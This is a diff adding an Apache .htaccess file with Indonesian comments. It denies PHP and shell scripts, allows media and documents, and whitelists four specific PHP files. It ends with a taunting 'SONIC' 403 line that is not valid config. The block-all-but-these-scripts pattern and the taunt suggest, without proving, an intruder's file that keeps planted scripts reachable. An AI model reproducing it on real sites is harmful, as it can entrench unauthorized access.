@@ -1,0 +1,38 @@
+Options -Indexes
+
+# Block PHP dan turunannya
+
+<FilesMatch ".(php|phtml|php3|php4|php5|php7|php8|phar)$">
+Require all denied </FilesMatch>
+
+# Block shell script
+
+<FilesMatch ".(sh)$">
+Require all denied </FilesMatch>
+
+# Block ActionScript
+
+<FilesMatch ".(as)$">
+Require all denied </FilesMatch>
+
+# Allow gambar
+
+<FilesMatch ".(jpg|jpeg|png|gif|bmp|ico|webp)$">
+Require all granted </FilesMatch>
+
+# Allow media
+
+<FilesMatch ".(mp4|avi|mov|wmv|mp3|wav|ogg|webm)$">
+Require all granted </FilesMatch>
+
+# Allow dokumen dan arsip
+
+<FilesMatch ".(pdf|doc|docx|xls|xlsx|zip|rar|tar|gz|ppt|pptx|csv)$">
+Require all granted </FilesMatch>
+
+# Izinkan file tertentu jika memang ada di folder ini
+
+<FilesMatch "^(default_search.php|view.search.php|models.php|system.php)$">
+Require all granted </FilesMatch>
+
+AWAS ADA SONIC UHUYYY 403 "FORBIDDEN"
